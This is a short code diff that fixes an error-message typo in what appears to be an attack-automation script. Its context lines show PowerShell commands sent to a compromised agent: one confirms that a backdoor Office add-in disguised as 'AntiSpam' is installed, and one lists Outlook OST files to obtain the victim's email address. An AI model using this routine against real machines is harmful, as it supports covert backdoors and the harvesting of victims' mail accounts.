@@ -74,7 +74,7 @@ def run(API, agent_name, vsto_zip_backdoor_url):
     # checks installation is complete
     opts['command'] = r"Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall' -recurse | Get-ItemProperty"
     if("AntiSpam" not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
-        raise ValueError("VTO installation failed")
+        raise ValueError("VSTO installation failed")
 
     # gets email address from OST file
     opts['command'] = r"Get-ChildItem $env:LocalAppData\Microsoft\Outlook\*.ost | % { $_.Name }"
